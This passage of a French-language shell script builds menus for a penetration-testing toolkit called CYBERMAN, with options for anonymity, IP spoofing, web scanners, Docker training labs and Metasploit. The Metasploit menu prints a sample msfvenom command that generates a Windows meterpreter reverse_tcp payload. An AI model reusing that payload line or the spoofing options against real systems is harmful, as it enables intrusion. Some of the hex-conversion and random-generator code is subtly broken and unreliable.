${BOLD}Catégories disponibles:${RESET}

${GREEN}1. Reconnaissance & Information Gathering${RESET}
   - Collecte d'informations sur les cibles
   - WHOIS, DNS, sous-domaines, etc.

${GREEN}2. Scanning & Enumeration${RESET}
   - Scan de ports et services
   - Énumération répertoires et partages

${GREEN}3. Vulnerability Assessment${RESET}
   - Détection de vulnérabilités
   - Tests SSL/TLS

${GREEN}4. Network Attacks & Exploitation${RESET}
   - Attaques réseau
   - Exploitation de vulnérabilités

${GREEN}5. Network Analysis & Monitoring${RESET}
   - Analyse et surveillance réseau
   - Capture de trafic

${GREEN}6. Privacy & Anonymity${RESET}
   - Outils d'anonymat
   - Proxy et Tor

${BOLD}Utilisation:${RESET}
Toutes les fonctions vérifient automatiquement si les outils requis
sont installés et proposent de les installer si nécessaire.

${BOLD}Note:${RESET}
Certaines fonctions nécessitent des privilèges sudo.
EOF
        echo ""
        printf "Appuyez sur une touche pour revenir au menu..."; read dummy
    }
    
    # =========================================================================
    # GESTION DE L'ANONYMAT
    # =========================================================================
    # DESC: Affiche le menu de gestion de l'anonymat
    # USAGE: show_anonymity_menu
    # EXAMPLE: show_anonymity_menu
    show_anonymity_menu() {
        show_header
        printf "${YELLOW}🔒 GESTION DE L'ANONYMAT${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Vérifier l'anonymat"
        echo "2.  Afficher les informations d'anonymat"
        echo "3.  Exécuter une commande avec anonymat"
        echo "4.  Configurer l'usurpation d'IP - IP spoofing"
        echo "5.  Supprimer l'usurpation d'IP"
        echo "6.  Exécuter un workflow avec anonymat"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Anonymat" <<'EOF'
Verifier l'anonymat|1
Afficher les informations d'anonymat|2
Executer une commande avec anonymat|3
Configurer l'usurpation d'IP|4
Supprimer l'usurpation d'IP|5
Executer un workflow avec anonymat|6
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1)
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh"
                    check_anonymity
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                fi
                ;;
            2)
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh"
                    show_anonymity_info
                    echo ""
                    printf "Appuyez sur une touche pour continuer..."; read dummy
                fi
                ;;
            3)
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh"
                    echo ""
                    printf "🔒 Commande à exécuter avec anonymat: "
        read cmd
                    if [ -n "$cmd" ]; then
                        run_with_anonymity $cmd
                        echo ""
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    fi
                fi
                ;;
            4)
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh"
                    echo ""
                    printf "🔧 IP à usurper: "
        read fake_ip
                    if [ -n "$fake_ip" ]; then
                        setup_ip_spoofing "$fake_ip"
                        echo ""
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    fi
                fi
                ;;
            5)
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh"
                    echo ""
                    printf "🔧 IP usurpée à supprimer: "
        read fake_ip
                    if [ -n "$fake_ip" ]; then
                        remove_ip_spoofing "$fake_ip"
                        echo ""
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    fi
                fi
                ;;
            6)
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ] && [ -f "$CYBER_DIR/workflow_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh"
                    . "$CYBER_DIR/workflow_manager.sh"
                    echo ""
                    list_workflows
                    echo ""
                    printf "📝 Nom du workflow: "
        read workflow_name
                    if [ -n "$workflow_name" ]; then
                        run_workflow_anonymized "$workflow_name"
                        echo ""
                        printf "Appuyez sur une touche pour continuer..."; read dummy
                    fi
                fi
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # UTILITAIRES (HASH, ENCODE/DECODE, etc.)
    # =========================================================================
    # DESC: Affiche le menu des utilitaires
    # USAGE: show_utilities_menu
    # EXAMPLE: show_utilities_menu
    show_utilities_menu() {
        show_header
        printf "${YELLOW}🛠️  UTILITAIRES${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  🔐 Calculer un hash - MD5, SHA1, SHA256, etc."
        echo "2.  🔄 Encoder/Décoder - Base64, URL, Hex, etc."
        echo "3.  🔍 Rechercher dans les fichiers"
        echo "4.  📝 Générer un mot de passe"
        echo "5.  🔢 Convertir entre formats - hex, decimal, binary"
        echo ""
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Utilitaires" <<'EOF'
Calculer un hash|1
Encoder/Decoder|2
Rechercher dans les fichiers|3
Generer un mot de passe|4
Convertir entre formats|5
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        
        case "$choice" in
            1)
                if [ -f "$CYBER_DIR/utils/hash_calculator.sh" ]; then
                    . "$CYBER_DIR/utils/hash_calculator.sh"
                    if type hash_calculator >/dev/null 2>&1; then
                        hash_calculator
                    else
                        echo "❌ Fonction hash_calculator non disponible"
                        sleep 2
                    fi
                else
                    echo "❌ Module hash_calculator non disponible"
                    sleep 2
                fi
                ;;
            2)
                if [ -f "$CYBER_DIR/utils/encoder_decoder.sh" ]; then
                    . "$CYBER_DIR/utils/encoder_decoder.sh"
                    if type encoder_decoder >/dev/null 2>&1; then
                        encoder_decoder
                    else
                        echo "❌ Fonction encoder_decoder non disponible"
                        sleep 2
                    fi
                else
                    echo "❌ Module encoder_decoder non disponible"
                    sleep 2
                fi
                ;;
            3)
                echo ""
                printf "🔍 Rechercher: "
        read search_term
                if [ -n "$search_term" ]; then
                    printf "📁 Dans le répertoire (ou . pour courant): "
        read search_dir
                    search_dir="${search_dir:-.}"
                    if [ -d "$search_dir" ]; then
                        echo ""
                        echo "Résultats:"
                        grep -r "$search_term" "$search_dir" 2>/dev/null | head -20
                    else
                        echo "❌ Répertoire invalide"
                    fi
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            4)
                echo ""
                printf "Longueur du mot de passe (défaut: 16): "
        read length
                length="${length:-16}"
                if command -v openssl &>/dev/null; then
                    echo "Mot de passe généré:"
                    openssl rand -base64 32 | tr -d "=+/" | cut -c1-${length}
                elif command -v /dev/urandom &>/dev/null; then
                    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${length} | head -n 1
                else
                    echo "❌ Aucun générateur aléatoire disponible"
                fi
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            5)
                echo ""
                printf "Valeur à convertir: "
        read value
                if [ -n "$value" ]; then
                    echo ""
                    echo "Conversions:"
                    # Hex to decimal
                    if [ "$value" =~ ^0x[0-9A-Fa-f]+$ ] || [ "$value" =~ ^[0-9A-Fa-f]+$ ]; then
                        hex_val="${value#0x}"
                        echo "  Hex: $hex_val"
                        echo "  Decimal: $((16#$hex_val))"
                        echo "  Binary: $(echo "obase=2; ibase=16; $hex_val" | bc 2>/dev/null || echo "N/A")"
                    # Decimal to hex
                    elif [ "$value" =~ ^[0-9]+$ ]; then
                        echo "  Decimal: $value"
                        echo "  Hex: $(printf "%x" "$value")"
                        echo "  Binary: $(echo "obase=2; $value" | bc 2>/dev/null || echo "N/A")"
                    else
                        echo "  Format non reconnu. Utilisez hex - 0x... ou ... ou decimal"
                    fi
                fi
                echo ""
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # APPRENTISSAGE & LABS (CYBERLEARN INTÉGRÉ)
    # =========================================================================
    # DESC: Affiche le menu d'apprentissage et labs
    # USAGE: show_learning_menu
    # EXAMPLE: show_learning_menu
    show_learning_menu() {
        show_header
        printf "${YELLOW}🎓 APPRENTISSAGE & LABS${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        # Charger cyberlearn si disponible
        CYBERLEARN_DIR="${HOME}/dotfiles/zsh/functions/cyberlearn"
        if [ -f "$CYBERLEARN_DIR/cyberlearn.zsh" ]; then
            . "$CYBERLEARN_DIR/cyberlearn.zsh" 2>/dev/null
        fi
        
        echo "1.  📖 Modules de Cours - basics, network, web, etc."
        echo "2.  🧪 Labs Pratiques - environnements Docker"
        echo "3.  🎯 Challenges & Exercices"
        echo "4.  📊 Ma Progression"
        echo "5.  🏆 Badges & Certificats"
        echo "6.  🐳 Gérer les Labs Docker"
        echo "7.  📚 Documentation & Aide"
        echo ""
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Apprentissage" <<'EOF'
Modules de Cours|1
Labs Pratiques|2
Challenges & Exercices|3
Ma Progression|4
Badges & Certificats|5
Gerer les Labs Docker|6
Documentation & Aide|7
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        
        case "$choice" in
            1)
                # Modules de cours
                if type cyberlearn >/dev/null 2>&1; then
                    cyberlearn start-module
                else
                    echo "❌ cyberlearn non disponible"
                    echo "💡 Les modules d'apprentissage seront bientôt intégrés directement"
                    sleep 2
                fi
                ;;
            2)
                # Labs pratiques
                if type cyberlearn >/dev/null 2>&1; then
                    cyberlearn lab
                else
                    show_labs_menu_direct
                fi
                ;;
            3)
                # Challenges
                if type cyberlearn >/dev/null 2>&1; then
                    # Utiliser cyberlearn pour les challenges
                    echo ""
                    echo "🎯 Challenge du Jour:"
                    cyberlearn 2>/dev/null || show_daily_challenge_direct
                else
                    show_daily_challenge_direct
                fi
                ;;
            4)
                # Progression
                if type cyberlearn >/dev/null 2>&1; then
                    cyberlearn progress
                else
                    show_progress_direct
                fi
                ;;
            5)
                # Badges
                if type cyberlearn >/dev/null 2>&1; then
                    # Afficher les badges via cyberlearn
                    echo ""
                    echo "🏆 Badges obtenus:"
                    cyberlearn 2>/dev/null || echo "Aucun badge pour le moment"
                else
                    echo "🏆 Badges obtenus:"
                    echo "  Aucun badge pour le moment"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            6)
                # Gestion labs Docker
                show_docker_labs_menu
                ;;
            7)
                # Documentation
                show_learning_docs
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # Menu labs direct (si cyberlearn non disponible)
    show_labs_menu_direct() {
        show_header
        printf "${CYAN}🧪 LABS PRATIQUES${RESET}\n\n"
        echo "Labs disponibles:"
        echo "1.  🕸️  web-basics - Lab Sécurité Web - XSS, SQLi"
        echo "2.  🌐 network-scan - Lab Scan Réseau"
        echo "3.  🔐 crypto-basics - Lab Cryptographie"
        echo "4.  🐧 linux-pentest - Lab Pentest Linux"
        echo "5.  🔍 forensics-basic - Lab Forensique"
        echo ""
        echo "0.  Retour"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Labs pratiques" <<'EOF'
web-basics|1
network-scan|2
crypto-basics|3
linux-pentest|4
forensics-basic|5
Retour|0
EOF
)
        
        case "$choice" in
            1) start_lab_docker "web-basics" ;;
            2) start_lab_docker "network-scan" ;;
            3) start_lab_docker "crypto-basics" ;;
            4) start_lab_docker "linux-pentest" ;;
            5) start_lab_docker "forensics-basic" ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # Démarrer un lab Docker
    start_lab_docker() {
        lab_name="$1"
        
        if ! command -v docker &>/dev/null; then
            echo "❌ Docker n'est pas installé"
            echo "💡 Installez-le avec: installman docker"
            sleep 2
            return 1
        fi
        
        if ! docker info &>/dev/null 2>&1; then
            echo "❌ Docker n'est pas en cours d'exécution"
            echo "💡 Démarrez Docker avec: sudo systemctl start docker"
            sleep 2
            return 1
        fi
        
        echo "🚀 Démarrage du lab: $lab_name"
        
        # Charger la fonction de lab depuis cyberlearn si disponible
        CYBERLEARN_DIR="${HOME}/dotfiles/zsh/functions/cyberlearn"
        if [ -f "$CYBERLEARN_DIR/utils/labs.sh" ]; then
            . "$CYBERLEARN_DIR/utils/labs.sh" 2>/dev/null
            start_lab "$lab_name"
        else
            echo "⚠️  Système de labs non disponible"
            echo "💡 Le lab sera bientôt intégré directement"
        fi
        
        printf "Appuyez sur une touche pour continuer..."; read dummy
    }
    
    # Challenge du jour direct
    show_daily_challenge_direct() {
        show_header
        printf "${CYAN}🎯 CHALLENGE DU JOUR${RESET}\n\n"
        today=$(date +%Y-%m-%d)
        day_of_year=$(date +%j)
        challenge_num=$((day_of_year % 10))
        
        case "$challenge_num" in
            0) challenge="Basics: Créez un mot de passe fort et vérifiez sa force" ;;
            1) challenge="Network: Scannez votre réseau et identifiez 3 hôtes actifs" ;;
            2) challenge="Web: Analysez les cookies d'un site web avec curl" ;;
            3) challenge="Crypto: Chiffrez un fichier avec GPG" ;;
            4) challenge="Linux: Analysez les permissions d'un fichier système" ;;
            5) challenge="Network: Capturez 10 paquets avec tcpdump" ;;
            6) challenge="Web: Testez une application web avec OWASP ZAP" ;;
            7) challenge="Basics: Vérifiez l'intégrité d'un fichier avec SHA256" ;;
            8) challenge="Network: Analysez un port ouvert avec nmap" ;;
            9) challenge="Web: Identifiez les vulnérabilités OWASP Top 10 sur un site" ;;
        esac
        
        printf "${GREEN}Challenge:${RESET} %s\n" "$challenge"
        printf "${BLUE}Date:${RESET} %s\n" "$today"
        echo ""
        echo "💡 Complétez ce challenge pour gagner des points !"
        echo ""
        printf "Appuyez sur une touche pour continuer..."; read dummy
    }
    
    # Progression directe
    show_progress_direct() {
        show_header
        printf "${CYAN}📊 MA PROGRESSION${RESET}\n\n"
        progress_file="${HOME}/.cyberlearn/progress.json"
        if [ -f "$progress_file" ] && command -v jq &>/dev/null; then
            modules_completed=$(jq -r '.stats.modules_completed // 0' "$progress_file" 2>/dev/null)
            labs_completed=$(jq -r '.stats.labs_completed // 0' "$progress_file" 2>/dev/null)
            
            echo "Modules complétés: $modules_completed/10"
            echo "Labs complétés: $labs_completed/5"
        else
            echo "Aucune progression enregistrée"
            echo "💡 Commencez un module ou un lab pour démarrer !"
        fi
        
        echo ""
        printf "Appuyez sur une touche pour continuer..."; read dummy
    }
    
    # Menu gestion labs Docker
    show_docker_labs_menu() {
        show_header
        printf "${CYAN}🐳 GESTION DES LABS DOCKER${RESET}\n\n"
        if ! command -v docker &>/dev/null; then
            echo "❌ Docker n'est pas installé"
            echo "💡 Installez-le avec: installman docker"
            sleep 2
            return
        fi
        
        echo "1.  🚀 Démarrer un lab"
        echo "2.  🛑 Arrêter un lab"
        echo "3.  📋 Lister les labs actifs"
        echo "4.  🧹 Nettoyer les containers"
        echo "5.  📊 Statut des labs"
        echo ""
        echo "0.  Retour"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Labs Docker" <<'EOF'
Demarrer un lab|1
Arreter un lab|2
Lister les labs actifs|3
Nettoyer les containers|4
Statut des labs|5
Retour|0
EOF
)
        
        case "$choice" in
            1) show_labs_menu_direct ;;
            2)
                echo ""
                echo "Labs actifs:"
                docker ps --format '{{.Names}}' | grep '^cyberlearn-' | sed 's/^cyberlearn-//' | nl || echo "  Aucun lab actif"
                echo ""
                printf "Nom du lab à arrêter: "
        read lab_name
                if [ -n "$lab_name" ]; then
                    docker stop "cyberlearn-$lab_name" 2>/dev/null && docker rm "cyberlearn-$lab_name" 2>/dev/null
                    echo "✅ Lab arrêté"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            3)
                echo ""
                echo "Labs actifs:"
                docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}' | grep -E 'cyberlearn|NAMES' || echo "  Aucun lab actif"
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            4)
                echo ""
                echo "🧹 Nettoyage des containers cyberlearn..."
                docker ps -a --filter "name=cyberlearn-" --format "{{.Names}}" | xargs -r docker rm 2>/dev/null
                echo "✅ Nettoyage terminé"
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            5)
                echo ""
                echo "📊 Statut des labs:"
                docker ps -a --format 'table {{.Names}}\t{{.Status}}' | grep -E 'cyberlearn|NAMES' || echo "  Aucun lab"
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # Documentation apprentissage
    show_learning_docs() {
        show_header
        printf "${CYAN}📚 DOCUMENTATION APPRENTISSAGE${RESET}\n\n"
        cat <<EOF
${BOLD}Modules disponibles:${RESET}
  • Basics - Bases de la cybersécurité
  • Network - Sécurité réseau
  • Web - Sécurité web
  • Crypto - Cryptographie
  • Linux - Sécurité Linux
  • Windows - Sécurité Windows
  • Mobile - Sécurité mobile
  • Forensics - Forensique numérique
  • Pentest - Tests de pénétration
  • Incident - Incident response

${BOLD}Labs disponibles:${RESET}
  • web-basics - Application web vulnérable (XSS, SQLi)
  • network-scan - Environnement réseau pour scanning
  • crypto-basics - Exercices de cryptographie
  • linux-pentest - Machine Linux vulnérable
  • forensics-basic - Analyse forensique de base

${BOLD}Pré-requis:${RESET}
  • Docker (pour les labs)
  • Outils réseau (nmap, wireshark, etc.)
  • jq (pour la progression JSON)

${BOLD}Commandes rapides:${RESET}
  • cyberlearn - Menu complet d'apprentissage
  • cyberlearn start-module <nom> - Démarrer un module
  • cyberlearn lab start <nom> - Démarrer un lab
  • cyberlearn progress - Voir la progression

EOF
        printf "Appuyez sur une touche pour continuer..."; read dummy
    }
    
    # =========================================================================
    # ASSISTANT DE TEST COMPLET
    # =========================================================================
    # DESC: Affiche le menu de l'assistant
    # USAGE: show_assistant_menu
    # EXAMPLE: show_assistant_menu
    show_assistant_menu() {
        show_header
        printf "${YELLOW}🚀 ASSISTANT DE TEST COMPLET${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "L'assistant vous guidera à travers:"
        echo "  • Configuration des cibles"
        echo "  • Configuration de l'anonymat"
        echo "  • Création/gestion d'environnements"
        echo "  • Création/gestion de workflows"
        echo "  • Exécution des tests"
        echo "  • Consultation des rapports"
        echo ""
        printf "Lancer l'assistant? (O/n): "
        read confirm
        if [ "$confirm" != "n" ] && [ "$confirm" != "N" ]; then
            if [ -f "$CYBER_DIR/assistant.sh" ]; then
                . "$CYBER_DIR/assistant.sh"
                show_assistant
            else
                echo "❌ Assistant non disponible"
                sleep 1
            fi
        fi
    }
    
    # =========================================================================
    # CATÉGORIE: WEB SECURITY & TESTING
    # =========================================================================
    # DESC: Affiche le menu de sécurité web
    # USAGE: show_web_menu
    # EXAMPLE: show_web_menu
    show_web_menu() {
        show_header
        printf "${YELLOW}🌐 WEB SECURITY & TESTING${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "🔍 SCANNERS DE VULNÉRABILITÉS:"
        echo "1.  Nuclei Scanner             - Scanner complet de vulnérabilités"
        echo "2.  XSS Scanner                 - XSStrike, Dalfox, Nuclei XSS"
        echo "3.  SQL Injection - SQLMap      - Test injection SQL"
        echo "4.  Web Fuzzer                  - ffuf, wfuzz"
        echo ""
        echo "📊 RECONNAISSANCE WEB:"
        echo "5.  Web dir enum                - Énumération répertoires web"
        echo "6.  Web port scan               - Scan ports web"
        echo "7.  Get HTTP headers            - En-têtes HTTP"
        echo "8.  Analyze headers             - Analyse en-têtes"
        echo "9.  Get robots.txt              - Récupération robots.txt"
        echo ""
        echo "🔒 SÉCURITÉ SSL/TLS:"
        echo "10. Check SSL                   - Vérification SSL"
        echo "11. Check SSL cert              - Vérification certificat SSL"
        echo ""
        echo "🛡️  AUTRES SCANS:"
        echo "12. Nikto scan                  - Scan Nikto"
        echo "13. Web vuln scan               - Scan vulnérabilités web"
        echo "14. Web app fingerprint         - Empreinte application web"
        echo "15. CMS detection               - Détection CMS"
        echo ""
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Web Security" <<'EOF'
Nuclei Scanner|1
XSS Scanner|2
SQL Injection - SQLMap|3
Web Fuzzer|4
Web dir enum|5
Web port scan|6
Get HTTP headers|7
Analyze headers|8
Get robots.txt|9
Check SSL|10
Check SSL cert|11
Nikto scan|12
Web vuln scan|13
Web app fingerprint|14
CMS detection|15
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        
        # Charger les modules de sécurité
        CYBERMAN_DIR="$HOME/dotfiles/zsh/functions/cyberman"
        
        case "$choice" in
            1)
                if [ -f "$CYBERMAN_DIR/modules/security/nuclei_module.sh" ]; then
                    . "$CYBERMAN_DIR/modules/security/nuclei_module.sh"
                    show_nuclei_menu
                else
                    echo "❌ Module Nuclei non disponible"
                    sleep 2
                fi
                ;;
            2)
                if [ -f "$CYBERMAN_DIR/modules/security/xss_scanner.sh" ]; then
                    . "$CYBERMAN_DIR/modules/security/xss_scanner.sh"
                    show_xss_menu
                else
                    echo "❌ Module XSS Scanner non disponible"
                    sleep 2
                fi
                ;;
            3)
                if [ -f "$CYBERMAN_DIR/modules/security/sqlmap_module.sh" ]; then
                    . "$CYBERMAN_DIR/modules/security/sqlmap_module.sh"
                    show_sqlmap_menu
                else
                    echo "❌ Module SQLMap non disponible"
                    sleep 2
                fi
                ;;
            4)
                if [ -f "$CYBERMAN_DIR/modules/security/fuzzer_module.sh" ]; then
                    . "$CYBERMAN_DIR/modules/security/fuzzer_module.sh"
                    show_fuzzer_menu
                else
                    echo "❌ Module Fuzzer non disponible"
                    sleep 2
                fi
                ;;
            5) . "$CYBER_DIR/scanning/web_dir_enum.sh" && ensure_tool gobuster && web_dir_enum ;;
            6) . "$CYBER_DIR/scanning/web_port_scan.sh" && ensure_tool nmap && web_port_scan ;;
            7) . "$CYBER_DIR/reconnaissance/get_http_headers.sh" && get_http_headers ;;
            8) . "$CYBER_DIR/reconnaissance/analyze_headers.sh" && analyze_headers ;;
            9) . "$CYBER_DIR/reconnaissance/get_robots_txt.sh" && get_robots_txt ;;
            10) . "$CYBER_DIR/vulnerability/check_ssl.sh" && check_ssl ;;
            11) . "$CYBER_DIR/vulnerability/check_ssl_cert.sh" && check_ssl_cert ;;
            12) . "$CYBER_DIR/vulnerability/nikto_scan.sh" && ensure_tool nikto && nikto_scan ;;
            13) . "$CYBER_DIR/vulnerability/web_vuln_scan.sh" && web_vuln_scan ;;
            14) echo "⚠️  Fonction Web app fingerprint à implémenter" ; sleep 2 ;;
            15) echo "⚠️  Fonction CMS detection à implémenter" ; sleep 2 ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE: IoT DEVICES & EMBEDDED SYSTEMS
    # =========================================================================
    # DESC: Affiche le menu pour les appareils IoT et systèmes embarqués
    # USAGE: show_iot_menu
    # EXAMPLE: show_iot_menu
    show_iot_menu() {
        show_header
        printf "${YELLOW}📱 IoT DEVICES & EMBEDDED SYSTEMS${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  IoT device scan           - Scan appareils IoT"
        echo "2.  MQTT scan                 - Scan serveurs MQTT"
        echo "3.  CoAP scan                 - Scan CoAP"
        echo "4.  Zigbee scan               - Scan réseaux Zigbee"
        echo "5.  Bluetooth scan            - Scan appareils Bluetooth"
        echo "6.  Firmware analysis         - Analyse firmware"
        echo "7.  Default credentials       - Test identifiants par défaut"
        echo "8.  UPnP scan                 - Scan UPnP"
        echo "9.  Modbus scan               - Scan Modbus"
        echo "10. BACnet scan               - Scan BACnet"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - IoT" <<'EOF'
IoT device scan|1
MQTT scan|2
CoAP scan|3
Zigbee scan|4
Bluetooth scan|5
Firmware analysis|6
Default credentials|7
UPnP scan|8
Modbus scan|9
BACnet scan|10
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) echo "⚠️  Fonction IoT device scan à implémenter" ; sleep 2 ;;
            2) echo "⚠️  Fonction MQTT scan à implémenter" ; sleep 2 ;;
            3) echo "⚠️  Fonction CoAP scan à implémenter" ; sleep 2 ;;
            4) echo "⚠️  Fonction Zigbee scan à implémenter" ; sleep 2 ;;
            5) echo "⚠️  Fonction Bluetooth scan à implémenter" ; sleep 2 ;;
            6) echo "⚠️  Fonction Firmware analysis à implémenter" ; sleep 2 ;;
            7) echo "⚠️  Fonction Default credentials à implémenter" ; sleep 2 ;;
            8) echo "⚠️  Fonction UPnP scan à implémenter" ; sleep 2 ;;
            9) echo "⚠️  Fonction Modbus scan à implémenter" ; sleep 2 ;;
            10) echo "⚠️  Fonction BACnet scan à implémenter" ; sleep 2 ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE: NETWORK TOOLS (regroupe Analysis, Attacks, Devices)
    # =========================================================================
    # DESC: Affiche le menu regroupé pour les outils réseau
    # USAGE: show_network_tools_menu
    # EXAMPLE: show_network_tools_menu
    show_network_tools_menu() {
        show_header
        printf "${YELLOW}📡 NETWORK TOOLS${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  📊 Network Analysis & Monitoring"
        echo "2.  ⚔️  Network Attacks & Exploitation"
        echo "3.  🔌 Network Devices & Infrastructure"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Network Tools" <<'EOF'
Network Analysis & Monitoring|1
Network Attacks & Exploitation|2
Network Devices & Infrastructure|3
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) show_analysis_menu ;;
            2) show_attack_menu ;;
            3) show_network_devices_menu ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE: ADVANCED TOOLS (Metasploit, Custom Scripts)
    # =========================================================================
    # DESC: Affiche le menu pour les outils avancés
    # USAGE: show_advanced_tools_menu
    # EXAMPLE: show_advanced_tools_menu
    show_advanced_tools_menu() {
        show_header
        printf "${YELLOW}🔧 ADVANCED TOOLS${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  🎯 Metasploit Framework"
        echo "2.  📜 Custom Nmap Scripts"
        echo "3.  🔨 Custom Exploitation Scripts"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Advanced Tools" <<'EOF'
Metasploit Framework|1
Custom Nmap Scripts|2
Custom Exploitation Scripts|3
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) show_metasploit_menu ;;
            2) show_custom_nmap_menu ;;
            3) show_custom_exploit_menu ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # DESC: Affiche le menu Metasploit
    # USAGE: show_metasploit_menu
    show_metasploit_menu() {
        show_header
        printf "${YELLOW}🎯 METASPLOIT FRAMEWORK${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Lancer msfconsole"
        echo "2.  Rechercher un exploit"
        echo "3.  Rechercher un payload"
        echo "4.  Rechercher un auxiliary"
        echo "5.  Lister les exploits récents"
        echo "6.  Générer un payload"
        echo "0.  Retour"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Metasploit" <<'EOF'
Lancer msfconsole|1
Rechercher un exploit|2
Rechercher un payload|3
Rechercher un auxiliary|4
Lister les exploits recents|5
Generer un payload|6
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1)
                if command -v msfconsole >/dev/null 2>&1; then
                    msfconsole
                else
                    echo "❌ Metasploit non installé"
                    echo "💡 Installez-le: sudo pacman -S metasploit"
                    sleep 2
                fi
                ;;
            2)
                printf "🔍 Rechercher un exploit: "
        read search_term
                if [ -n "$search_term" ] && command -v msfconsole >/dev/null 2>&1; then
                    msfconsole -q -x "search exploit $search_term; exit"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            3)
                printf "🔍 Rechercher un payload: "
        read search_term
                if [ -n "$search_term" ] && command -v msfconsole >/dev/null 2>&1; then
                    msfconsole -q -x "search payload $search_term; exit"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            4)
                printf "🔍 Rechercher un auxiliary: "
        read search_term
                if [ -n "$search_term" ] && command -v msfconsole >/dev/null 2>&1; then
                    msfconsole -q -x "search auxiliary $search_term; exit"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            5)
                if command -v msfconsole >/dev/null 2>&1; then
                    msfconsole -q -x "show exploits; exit" | head -50
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            6)
                echo "💡 Utilisez msfvenom pour générer des payloads"
                if command -v msfvenom >/dev/null 2>&1; then
                    echo "Exemple: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe"
                else
                    echo "❌ msfvenom non disponible"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
